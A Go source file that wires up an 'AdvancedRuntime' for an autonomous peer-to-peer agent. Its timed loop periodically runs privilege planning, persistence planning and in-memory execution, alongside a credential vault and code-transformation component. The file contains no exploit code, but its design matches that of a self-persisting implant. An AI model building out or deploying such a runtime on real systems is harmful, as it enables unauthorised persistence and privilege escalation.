package agent

import (
	"context"
	"log/slog"
	"time"

	"github.com/naviNBRuas/APA/pkg/networking"
)

// AdvancedRuntime bundles higher-order behaviors (triggers, autonomy, orchestration, retention).
type AdvancedRuntime struct {
	logger       *slog.Logger
	orchestrator *NativeOrchestrator
	memoryExec   MemoryExecutor
	transformer  *TransformationManager
	inspector    EnvInspector
	triggers     TriggerConditions
	stateMachine *AutonomousStateMachine
	vault        *CredentialVault
	persistence  PersistencePlanner
	privPlanner  PrivilegePlanner
	messenger    *networking.EncryptedMessenger
}

func NewAdvancedRuntime(logger *slog.Logger, eng *TransformationManager, messenger *networking.EncryptedMessenger) *AdvancedRuntime {
	return &AdvancedRuntime{
		logger:       logger,
		orchestrator: NewNativeOrchestrator(nil),
		memoryExec:   MemoryExecutor{},
		transformer:  eng,
		inspector:    EnvInspector{},
		triggers:     TriggerConditions{Cooldown: time.Minute},
		stateMachine: NewAutonomousStateMachine(TaskBudget{}),
		vault:        NewCredentialVault(),
		persistence:  PersistencePlanner{},
		privPlanner:  PrivilegePlanner{},
		messenger:    messenger,
	}
}

// Run periodically evaluates triggers and autonomy decisions; kept lightweight and side-effect minimal.
func (ar *AdvancedRuntime) Run(ctx context.Context, peerCount func() int) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	lastExec := time.Time{}
	executed := 0
	for {
		select {
		case <-ctx.Done():
			return
		case now := <-ticker.C:
			state := ActivationState{Now: now, PeerCount: peerCount(), LastExecution: lastExec, NetworkIdle: true}
			if ar.triggers.ShouldActivate(state) && ar.stateMachine.Tick(now, executed) {
				ar.vault.Put("heartbeat", "alive", time.Minute*5)
				lastExec = now
				executed++
			}
			// Periodic privilege and persistence actions every 10 ticks
			if executed%10 == 0 {
				plan := ar.privPlanner.Plan()
				ar.privPlanner.Execute(plan)
				ar.persistence.Plan(ar.inspector.Snapshot())
				ar.memoryExec.Execute(ar.orchestrator, ar.transformer, ar.inspector)
			}
		}
	}
}
